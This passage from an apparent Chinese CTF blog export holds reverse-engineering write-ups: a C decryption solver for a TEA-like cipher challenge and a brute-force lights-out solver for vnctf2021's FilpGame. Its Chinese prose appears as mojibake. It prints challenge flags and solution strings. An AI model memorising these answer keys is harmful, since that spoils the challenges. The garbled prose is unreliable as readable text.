src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403221308523.png" alt="image-20210403221308523"></p><p>æŠŠä¸Šé¢çš„åŠ å¯†åŒ–ç®€ä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc[<span class="number">0</span>] += (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>)^(<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[v23]+v22);</span><br><span class="line">enc[<span class="number">1</span>] += (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[v25]+v22+<span class="number">0x12345678</span>);</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯è§£å¯†ï¼šæ³¨æ„ç»†å¿ƒå§ã€‚ã€‚è¿™é‡Œå› ä¸ºåŠ å·è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äºå¼‚æˆ–ï¼Œæˆ‘åˆå¿˜äº†åœ¨ä»–ä»¬ä¸€èµ·æ—¶ç»™å¼‚æˆ–åŠ ä¸€ä¸ªæ‹¬å·ï¼Œä¸€ç›´è§£å¯†å‡ºé”™ï¼ŒçœŸå°±ç¡¬çœ‹äº†äºŒä¸ªå°æ—¶ã€‚ã€‚ã€‚1ä¸ªæ‹¬å·ï¼Œ2ä¸ªå°æ—¶ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> opcode[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> KEY[] = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">10</span>, </span><br><span class="line"><span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">14</span>, <span class="number">195</span>, <span class="number">17</span>, <span class="number">240</span>, <span class="number">69</span>, <span class="number">199</span>, <span class="number">154</span>, <span class="number">243</span>, <span class="number">237</span>, <span class="number">245</span>,</span><br><span class="line">   <span class="number">217</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">203</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + ((enc[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">0</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">2</span>]]+opcode[<span class="number">3</span>*j]+<span class="number">0x12345678</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + ((enc[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>) ^ (<span class="number">16</span>*enc[<span class="number">1</span>]))) ^ (key[opcode[<span class="number">3</span>*j+<span class="number">1</span>]]+opcode[<span class="number">3</span>*j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">        enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">        enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v17 = <span class="number">0</span>, v18 = <span class="number">0</span>, v22, v23, v25;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(v17 &lt; <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">v22 = v18;</span><br><span class="line">v23 = v18&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v22+<span class="number">0x12345678</span>);</span><br><span class="line">v25 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v18 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">opcode[v17*<span class="number">3</span>] = v22;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">1</span>] = v23;</span><br><span class="line">opcode[v17*<span class="number">3</span>+<span class="number">2</span>] = v25;</span><br><span class="line">v17++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">tea_decode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        swap(ENC+i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">4</span> || i == <span class="number">6</span> || i == <span class="number">8</span> || i == <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'-'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vnctf2021</title>
      <link href="/2021/03/18/vnctf2021/"/>
      <url>/2021/03/18/vnctf2021/</url>
      
        <content type="html"><![CDATA[<p>å°±å¯¹å…¶ä¸­æ„Ÿè§‰æœ‰æ„æ€çš„2ä¸ªé€†å‘é¢˜åšä¸€ä¸‹è®°å½•ï¼Œä¹Ÿæ˜¯å¤ç°ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ã€‚<a id="more"></a></p><p>å…¶ä¸­ç¬¬ä¸€ä¸ªæ˜¯å½“æ—¶ç®—æ³•å†™ä¸æ¥ï¼Œå¤ªå¼±äº†ã€‚å¦å¤–ä¸€æ˜¯appä½¿ç”¨hookæ›´æ”¹äº†å¯†é’¥ï¼Œä½†æ˜¯æˆ‘å¯¹ç¨‹åºé‡æ‰“åŒ…åï¼Œè¿™ä¸ªhookå¤±æ•ˆäº†ï¼Œå¯¼è‡´ä¸€ç›´è§£å¯†å‡ºé”™åˆæ‰¾ä¸åˆ°åŸå› ã€‚</p><h2 id="FilpGame"><a href="#FilpGame" class="headerlink" title="FilpGame"></a>FilpGame</h2><p>æ•´ä¸ªç¨‹åºå°±ä¸€ä¸ªmainå‡½æ•°ã€‚</p><p>è¾“å…¥é•¿åº¦è¦å°äº214ï¼Œå¯¹è¾“å…¥çš„æ¯2ä¸ªå…ˆè¿›è¡Œä¸€ä¸ªint(x, 16)æ“ä½œï¼Œç„¶åè¿›è¡Œç¨‹åºçš„å…³é”®æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¥‡æ•°ä½æ‰æ“ä½œï¼š</p><p><img src="/2021/03/18/vnctf2021/image-20210421134509045.png" alt="image-20210421134509045"></p><p>åœ¨è¿›è¡Œçš„å…³é”®æ“ä½œå¼€å§‹å‰å°±è¦æ±‚æˆ‘ä»¬è¾“å…¥çš„æ¯2ä¸ªä½è¿›è¡Œhex.decode()æ“ä½œåçš„å€¼æ˜¯é€’å¢åºåˆ—ï¼Œä»åé¢å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå®é™…å°±æ˜¯è§„å®šäº†æˆ‘ä»¬è¾“å…¥åæ ‡æ˜¯é¡ºåºï¼Œé€’å¢ã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210421134750425.png" alt="image-20210421134750425"></p><p>åé¢å°±æ˜¯å…³é”®å¤„ç†è¾“å…¥çš„åœ°æ–¹äº†ï¼Œç¨‹åºçš„å…³é”®ï¼Œå°±æ˜¯ä½æ“ä½œã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210421190532649.png" alt="image-20210421190532649"></p><p>å…ˆç†Ÿæ‚‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ul><li><strong>x ^ 0 = x</strong></li><li><strong>x ^ 1 = !x</strong></li></ul><p>ç„¶åå…¶å®ä¸Šé¢çš„å°±æ˜¯æ“ä½œä¸€ä¸ª16*16çš„çŸ©é˜µï¼Œåªä¸è¿‡ç”¨äº†16ä¸ªwordå‹æ•°æ®çš„æ¯ä¸€ä¸ªbitä½è¿›è¡Œå­˜å‚¨ï¼ˆçœŸæ˜¯ä¸ªå¥½æƒ³æ³•ï¼‰ï¼Œå¯¹è¾“å…¥åæ ‡å’Œå®ƒä¸Šä¸‹å·¦å³è¿›è¡Œbitåè½¬ï¼Œ0å˜1ï¼Œ1å˜0ã€‚</p><p>æœ€åç¨‹åºçš„æ¯”è¾ƒå°±æ˜¯æ•´ä¸ª16*16çš„çŸ©é˜µå…¨ä¸º1ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªç‚¹ç¯æ¸¸æˆ/ç¿»è½¬æ¸¸æˆï¼Œå…¸å‹çš„ç®—æ³•é¢˜äº†ï¼Œä½†æ—¶é—´è¦æ±‚ä¸Šå®½æ¾äº†ä¸å°‘ã€‚ã€‚</p><p>å¤ªå¼±äº†ï¼Œå†™ä¸æ¥ï¼Œæ¯”èµ›æ—¶ä¹Ÿå¡åœ¨äº†è¿™é‡Œï¼Œèµ›åå‘ç°å¤§å®¶æœ‰çš„ç«Ÿç„¶ç›´æ¥æ˜¯æ‰¾äº†ç½‘ä¸Šç°æˆçš„è„šæœ¬ï¼Œæœç´¢çš„é‡è¦æ€§ã€‚ã€‚</p><p>çœ‹äº†wpï¼Œé‡‡ç”¨çˆ†ç ´ç¬¬ä¸€è¡Œçš„æ‰€æœ‰å¯èƒ½ï¼ˆ2^16ï¼‰ï¼Œæ¥ç€æ¨å‡ºç¬¬äºŒè¡Œçš„æƒ…å†µï¼Œä¾æ¬¡è¿›è¡Œä¸‹å»ï¼Œå¦‚æœæœ€åä¸€è¡Œéƒ½æ˜¯1åˆ™æ»¡è¶³æ¡ä»¶ã€‚</p><p>è¿™ç§æƒ³æ³•ç¡®å®å¯è¡Œï¼Œè€Œä¸”å®ç°èµ·æ¥ä¹Ÿä¸éš¾ï¼Œå…¶å®å°±æ˜¯æŠŠæ‰€æœ‰å¯èƒ½ç¿»çš„æƒ…å†µç©·ä¸¾ï¼Œç„¶åæ‰¾æœ€å°è§£ã€‚</p><p>è€Œè¿™ç§åšæ³•å¦‚æœä¸ç”¨æœç´¢æ¥åšçš„è¯ï¼Œ<strong>æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ç©·ä¸¾ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æƒ…å†µå‘¢ï¼Œä¸€ä¸ªå¥½åŠæ³•ï¼šå› ä¸ºã€0-2^16-1ã€‘æ¯ä¸ªæ•°çš„äºŒè¿›åˆ¶ä½éƒ½ä¸ä¸€æ ·ï¼Œä¸”åªæœ‰16ä½ï¼Œé‚£ä¹ˆæ¯æ¬¡å‘å³ç§»ä½ã€0-15ã€‘ï¼Œå¦‚æœä¸º1å°±åè½¬ï¼Œè¿™æ ·å°±å®ç°äº†ã€‚</strong></p><p><img src="/2021/03/18/vnctf2021/image-20210421200351125.png" alt="image-20210421200351125"></p><p>æœ€åæ•´ä½“ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">500</span>, cnt, flag;</span><br><span class="line"><span class="keyword">int</span> dx[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">16</span>][<span class="number">16</span>], b[<span class="number">16</span>][<span class="number">16</span>], fi;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>], tmp[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a<span class="number">-10</span>+<span class="number">65</span>:a+<span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filp</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cnt++;</span><br><span class="line">tmp[fi++] = to_hex(y), tmp[fi++] = to_hex(x);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x1 = x+dx[i];</span><br><span class="line"><span class="keyword">int</span> y1 = y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt; <span class="number">16</span> &amp;&amp; y1 &gt;=<span class="number">0</span> &amp;&amp; y1 &lt; <span class="number">16</span>)</span><br><span class="line">b[x1][y1] ^= <span class="number">1</span>;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>); i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt = <span class="number">0</span>, flag = <span class="number">0</span>, fi = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">memcpy</span>(b, a, <span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i &gt;&gt; j)&amp;<span class="number">1</span>)</span><br><span class="line">filp(<span class="number">0</span>, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[j][k] == <span class="number">0</span>)</span><br><span class="line">filp(j+<span class="number">1</span>, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[<span class="number">15</span>][j] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt &lt; <span class="built_in">min</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, tmp, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">min</span> = cnt;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span> == <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">int</span> enc[] = &#123;<span class="number">48885</span>, <span class="number">35772</span>, <span class="number">41193</span>, <span class="number">29456</span>, <span class="number">55568</span>, <span class="number">41901</span>,</span><br><span class="line"> <span class="number">52406</span>, <span class="number">19934</span>, <span class="number">13388</span>, <span class="number">15318</span>, <span class="number">26385</span>, <span class="number">34447</span>, <span class="number">7290</span>, <span class="number">33829</span>, <span class="number">27405</span>, <span class="number">6988</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">a[i][j] = (enc[i] &gt;&gt; (<span class="number">15</span>-j)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fun() &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœï¼Œæœ€åmd5ä¸€ä¸‹ã€‚</p><p>åˆå»æœé›†èµ„æ–™ï¼Œå¯ä»¥çœ‹è¿™ä¸ªé¢˜ä½œä¸ºå‚è€ƒ<a href="https://blog.csdn.net/mjj1024/article/details/80208428" target="_blank" rel="noopener">filp game</a>ã€‚ç„¶åæƒ³äº†å¾ˆä¹…é€’å½’çš„å†™æ³•ï¼Œæ€æƒ³å…¶å®è¿˜æ˜¯ä¸€æ ·ï¼Œä»ç¬¬ä¸€è¡Œå¼€å§‹ï¼Œä¸€è¡Œä¸€è¡Œçš„ç¡®å®šéƒ½æ˜¯1ï¼Œè‹¥è¾¾ä¸åˆ°å°±å›æº¯ï¼Œç›´åˆ°æœ€åä¸€è¡Œï¼Œç„¶åæ£€æŸ¥æ˜¯å¦å…¨ä¸º1ã€‚</p><p>ä¸Šé¢è¯´çš„åªæ˜¯åŠ äº†æ¯ä¸€è¡Œæ“ä½œå®Œåçš„åˆ¤æ–­ï¼Œä½†ä»ç„¶æ˜¯å…¨æœï¼Œ16*16çš„è§„æ¨¡è¿˜æ˜¯å¤ªå¤§äº†ï¼Œä¸å¯è¡Œã€‚</p><p>å¼€å§‹æ”¹è¿›ï¼Œä½¿ç”¨çˆ†ç ´ä¸€æ ·çš„æ€æƒ³ï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå½“å‰ä¸€è¡Œçš„åŒåˆ—ä½ç½®ä¸º0æ—¶æ‰ç»§ç»­ä¸‹å»ï¼Œå¦åˆ™å°±å›æº¯ã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210424094440844.png" alt="image-20210424094440844"></p><p>è·‘äº†ä¸€ä¸‹æ”¹è¿›åçš„ï¼Œè·‘å‡ºä¸€ç»„è§£è¿˜æ˜¯å¾ˆå¿«çš„ï¼Œä½†è¦ç©·ä¸¾åæ‰¾åˆ°ç›®æ ‡è§£ï¼Œä»ç„¶è¦å¾ˆä¹…ï¼Œï¼Œä¸»è¦æ˜¯è¿™æ ·æœç´¢å¤šäº†å›æº¯çš„è¿‡ç¨‹ï¼Œ<strong>å¯¹æ¯ä¸€è¡Œè¦èµ°çš„ä½ç½®ï¼ˆå½“å‰ä¸€è¡Œçš„åŒåˆ—ä½ç½®ä¸º0ï¼‰è¿›è¡Œäº†ä¸€ä¸ªæ‰€æœ‰æƒ…å†µæœç´¢ã€‚</strong></p><p>è¿™æ ·ï¼Œä¹Ÿæ²¡æœ‰ç»§ç»­åœ¨è¿™ä¸ªæœç´¢ç®—æ³•ä¸Šç»§ç»­å»æ”¹è¿›äº†ï¼Œç»§ç»­æ”¹è¿›ä¸å°±å’Œçˆ†ç ´ä¸€æ ·äº†ã€‚ã€‚æ‰€ä»¥è¯´è¿™ç±»é—®é¢˜ï¼Œè§„æ¨¡å¤§ä»¥åï¼Œé‡‡ç”¨ç©·ä¸¾ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æƒ…å†µï¼Œç„¶åæ ¹æ®ç¬¬ä¸€è¡Œæƒ…å†µä¾æ¬¡çˆ†ç ´å‡ºåé¢çš„è¡Œæ˜¯å¾ˆå¥½çš„åŠæ³•äº†ã€‚</p><p>è´´ä¸€ä¸‹æœç´¢ç®—æ³•ï¼ˆè·‘è¿‡è§„æ¨¡å°ä¸€äº›çš„ï¼Œæ˜¯å¯ä»¥çš„ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 